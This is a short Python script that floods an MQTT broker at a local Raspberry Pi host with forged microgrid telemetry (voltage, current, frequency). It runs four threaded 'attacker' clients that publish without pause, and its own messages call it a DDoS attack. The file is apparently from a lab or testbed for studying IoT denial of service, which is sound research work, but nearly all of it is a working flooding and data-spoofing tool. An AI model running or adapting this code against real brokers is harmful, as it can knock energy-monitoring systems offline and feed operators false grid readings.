import paho.mqtt.client as mqtt
import random
import json
import time
import threading
import os
import signal
import sys

BROKER = "raspberrypi.local"
PORT = 1883

sent_data_count = {}
failed_data_count = {}


def signal_handler(sig, frame):
    print("Stopping DDoS attack...")
    sys.exit(0)


def on_connect(client, userdata, flags, rc):
    client.connected_flag = True
    print(f"Attacker {userdata} connected.")


def publish_data(client, ClientId):
    global sent_data_count, failed_data_count
    sent_data_count[ClientId] = 0
    failed_data_count[ClientId] = 0

    while True:
        if client.connected_flag:
            # Generate fake microgrid data
            voltage = round(random.uniform(200.0, 250.0), 2)  # in Volts
            current = round(random.uniform(5.0, 60.0), 2)  # in Amps
            power_output = round(voltage * current, 2)  # in Watts
            energy_consumed = round(random.uniform(0.1, 15.0), 2)  # in kWh
            frequency = round(random.uniform(48.0, 52.0), 2)  # in Hz

            payload = json.dumps(
                {
                    "ClientId": ClientId,
                    "voltage": voltage,
                    "current": current,
                    "power_output": power_output,
                    "energy_consumed": energy_consumed,
                    "frequency": frequency,
                }
            )

            result = client.publish("iot/devices", payload)
            if result.rc == mqtt.MQTT_ERR_SUCCESS:
                sent_data_count[ClientId] += 1
            else:
                failed_data_count[ClientId] += 1


def start_attacker(ClientId):
    client = mqtt.Client(userdata=ClientId)
    client.on_connect = on_connect
    client.connected_flag = False
    client.connect(BROKER, PORT, 60)
    client.loop_start()

    thread = threading.Thread(target=publish_data, args=(client, ClientId))
    thread.start()


if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    for i in range(1, 5):
        start_attacker(f"attacker_{i}")

    while True:
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        print(f"Data sent: {sent_data_count}")
        print(f"Data failed: {failed_data_count}")